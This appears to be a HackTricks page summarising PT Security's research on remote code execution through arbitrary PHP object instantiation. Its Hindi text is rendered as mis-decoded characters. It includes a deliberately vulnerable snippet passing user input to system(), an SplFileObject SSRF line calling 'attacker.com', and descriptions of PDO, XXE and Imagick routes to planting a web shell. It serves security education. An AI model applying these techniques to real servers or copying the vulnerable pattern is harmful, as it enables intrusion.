# PHP - RCE abusing object creation: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИред

## рдкрд░рд┐рдЪрдп

рдирдИ рдордирдорд╛рдиреА рд╡рд╕реНрддреБрдУрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдг, рдЬреИрд╕реЗ `new $_GET["a"]($_GET["a"])`, рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди (RCE) рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдПрдХ [**рд▓реЗрдЦ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

## рдХрд╕реНрдЯрдо рдХрдХреНрд╖рд╛рдУрдВ рдпрд╛ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

`new $a($b)` рдХрд╛ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдПрдХ рд╡рд╕реНрддреБ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ **`$a`** рдХрдХреНрд╖рд╛ рдХрд╛ рдирд╛рдо рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдФрд░ **`$b`** рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкрд╣рд▓рд╛ рддрд░реНрдХ рд╣реИред рдпреЗ рдЪрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдЬреИрд╕реЗ GET/POST рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдБ рд╡реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдпрд╛ рдПрд░реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ JSON рд╕реЗ, рдЬрд╣рд╛рдБ рд╡реЗ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, `$a` рдХреЛ `App` рдпрд╛ `App2` рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдФрд░ `$b` рдХреЛ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдб (рдЬреИрд╕реЗ, `uname -a`) рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдЙрд╕ рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрддрд╛ рд╣реИред

**рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рди** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдРрд╕реА рдХреЛрдИ рдХрдХреНрд╖рд╛рдПрдБ рд╕реАрдзреЗ рд╕реБрд▓рдн рдирд╣реАрдВ рд╣реИрдВред рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрдиреНрд╣реЗрдВ `spl_autoload_register` рдпрд╛ `__autoload` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
PHP рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рднрд┐рдиреНрди рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рд╡рд┐рднрд┐рдиреНрди RCE рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдХрд╕реНрдЯрдо рдХрдХреНрд╖рд╛рдУрдВ рдпрд╛ рдСрдЯреЛрд▓реЛрдбрд░реНрд╕ рдХреА рдХрдореА рдореЗрдВ, **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд PHP рдХрдХреНрд╖рд╛рдПрдБ** RCE рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдЗрди рдХрдХреНрд╖рд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ PHP рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ 100 рд╕реЗ 200 рдХреЗ рдмреАрдЪ рд╣реЛрддреА рд╣реИред рдЗрдиреНрд╣реЗрдВ `get_declared_classes()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд░рд┐рдлреНрд▓реЗрдХреНрд╢рди API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реБрдЪрд┐ рдХреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░реНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдФрд░ рд▓рд┐рдВрдХ [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:**

### **SSRF + Phar Deserialization**

`SplFileObject` рдХрдХреНрд╖рд╛ рдЕрдкрдиреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SSRF рдХреЛ рд╕рдХреНрд╖рдо рдмрдирд╛рддреА рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рднреА URL рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```php
new SplFileObject('http://attacker.com/');
```
SSRF рдкреБрд░рд╛рдиреЗ PHP рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ 8.0 рд╕реЗ рдкрд╣рд▓реЗ deserialization рд╣рдорд▓реЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ Phar рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

### **PDOs рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛**

PDO рдХреНрд▓рд╛рд╕ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ DSN рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдирд┐рд░реНрдорд╛рдг рдпрд╛ рдЕрдиреНрдп рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP рдХреЗ 5.3.22 рдФрд░ 5.4.12 рддрдХ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг `SoapClient` рдФрд░ `SimpleXMLElement` рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XXE рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдереЗ, рдЬреЛ libxml2 рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред

## RCE via Imagick Extension

рдПрдХ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рдирд┐рд░реНрднрд░рддрд╛рдУрдВ** рдХреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдореЗрдВ, рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ **Imagick** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди** рдХреЗ рд▓рд┐рдП рдирдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдЗрдВрд╕реНрдЯреЗрдВрдЯрд┐рдПрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрд╡рд╕рд░ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИред

### VID parser

рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрд┐рд╕реА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрде рдкрд░ рд╕рд╛рдордЧреНрд░реА рд▓рд┐рдЦрдиреЗ рдХреА VID parser рдХреНрд╖рдорддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЧрдИред рдЗрд╕рд╕реЗ рдПрдХ рд╡реЗрдм-рдПрдХреНрд╕реЗрд╕рд┐рдмрд▓ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ PHP рд╢реЗрд▓ рд░рдЦрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ Remote Code Execution (RCE) рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

#### VID Parser + File Upload

рдпрд╣ noted рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ PHP рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ `/tmp/phpXXXXXX` рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред Imagick рдореЗрдВ VID parser, **msl** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдлрд╝рд╛рдЗрд▓ рдкрде рдореЗрдВ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЛ рд╕рдВрднрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЪреБрдиреЗ рд╣реБрдП рд╕реНрдерд╛рди рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдордирдорд╛рдиреЗ рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред

### PHP Crash + Brute Force

[**рдореВрд▓ рд▓реЗрдЦ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рдПрдХ рд╡рд┐рдзрд┐ рдореЗрдВ рдРрд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕рд░реНрд╡рд░ рдХреНрд░реИрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреА рд╣реИрдВред рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдХреЗ, Imagick рдХреЗ рд▓рд┐рдП рдордирдорд╛рдирд╛ PHP рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ ImageMagick рдХреЗ рдПрдХ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдкреНрд░рднрд╛рд╡реА рдкрд╛рдИ рдЧрдИред

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
